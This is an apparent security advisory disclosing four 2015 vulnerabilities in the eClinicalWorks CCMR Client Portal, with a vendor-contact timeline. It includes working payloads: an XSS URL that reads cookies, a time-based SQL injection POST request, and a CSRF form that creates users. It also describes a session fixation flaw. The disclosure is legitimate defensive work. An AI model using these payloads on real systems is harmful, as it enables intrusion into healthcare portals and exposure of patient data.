@@ -1,0 +1,100 @@
+# Title: eClinicalWorks (CCMR) - Multiple Vulnerabilities
+# Vendor: https://www.eclinicalworks.com
+# Product: eClinicalWorks Population Health (CCMR) Client Portal Software 
+# URL: https://www.eclinicalworks.com/products-services/population-health-ccmr/
+# Credit: Jerold Hoong
+
+-------------------------------------
+
+# CVE-2015-4591 CROSS-SITE SCRIPTING
+Cross-site scripting (XSS) vulnerability in login.jsp in eClinicalWorks Population
+Health (CCMR) Client Portal Software allows remote authenticated users to inject
+arbitrary javascript via the strMessage parameter.
+
+https://127.0.0.1/mobiledoc/jsp/ccmr/clientPortal/login.jsp?strMessage=
+%3Cimg%20src=/%20onerror=%22alert%28document.cookie%29%22/%3E
+
+-------------------------------------
+
+# CVE-2015-4592 SQL INJECTION
+SQL injection vulnerability in portalUserService.jsp in eClinicalWorks Population
+Health (CCMR) Client Portal Software allows remote authenticated users to inject
+arbitrary malicious database commands as part of user input.
+
+Parameter: uemail (POST PARAMETER)
+Type: stacked queries
+Title: Microsoft SQL Server/Sybase stacked queries (comment)
+Payload: action=updatePersonalInfo&ufname=john&ulname=doe&upaddress=&upcity=&upstate=
+&zipcode=&uemail=john.doe@test.com';WAITFOR DELAY '0:0:5'--&upphone=0&umobileno=
+
+POST /mobiledoc/jsp/ccmr/clientPortal/admin/service/portalUserService.jsp HTTP/1.1
+Host: 127.0.0.1:443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: https://127.0.0.1/mobiledoc/jsp/ccmr/clientPortal/dashBoard.jsp
+Content-Length: 186
+[SNIP] ...
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+[SNIP] ...
+
+action=updatePersonalInfo&ufname=john&ulname=doe&upaddress=&upcity=&upstate=
+&zipcode=&uemail=john.doe@test.com';WAITFOR DELAY '0:0:5'--&upphone=0&umobileno=
+
+-------------------------------------
+
+# CVE-2015-4593 CROSS-SITE REQUEST FORGERY
+Cross-site request forgery (CSRF) vulnerability in portalUserService.jsp in eClinicalWorks 
+Client Portal allows remote attackers to hijack the authentication of content administrators
+for requests that could lead to the creation, modification and deletion of users, appointments
+and employees.
+
+# ADDING OF USER
+<html>
+  <body>
+    <form action="https://127.0.0.1/mobiledoc/jsp/ccmr/clientPortal/admin/service/portalUserService.jsp" method="POST">
+      <input type="hidden" name="action" value="add" />
+      <input type="hidden" name="uid" value="0" />
+      <input type="hidden" name="createdOver" value="1" />
+      <input type="hidden" name="ufname" value="John" />
+      <input type="hidden" name="ulname" value="Doe" />
+      <input type="hidden" name="uminitial" value="" />
+      <input type="hidden" name="selUserType" value="1" />
+      <input type="hidden" name="status" value="0" />
+      <input type="hidden" name="upaddress" value="" />
+      <input type="hidden" name="upcity" value="" />
+      <input type="hidden" name="upstate" value="" />
+      <input type="hidden" name="zipcode" value="" />
+      <input type="hidden" name="uemail" value="johndoe@test.com.de" />
+      <input type="hidden" name="upphone" value="98999299" />
+      <input type="hidden" name="umobileno" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+-------------------------------------
+
+# CVE-2015-4594 SESSION FIXATION
+The web application is vulnerable to session fixation attacks. When authenticating a user
+the application does not assign a new session ID, making it possible to use an existent
+session ID.
+
+-------------------------------------
+
+# TIMELINE
+– 16/06/2015: Vulnerability found
+– 16/06/2015: Vendor informed
+– 16/06/2015: Request for CVE IDs
+- 16/06/2015: MITRE issued CVE numbers
+– 16/06/2015: Vendor responded requesting more information on support contract etc
+- 21/06/2015: No support contract, vendor does not open case
+- 22/06/2015: Requested update from vendor, no response
+- 01/07/2015: Contacted vendor again, vendor requested for support contract again
+- 02/07/2015: No support contract, no response from vendor
+– 31/01/2016: Public disclosure
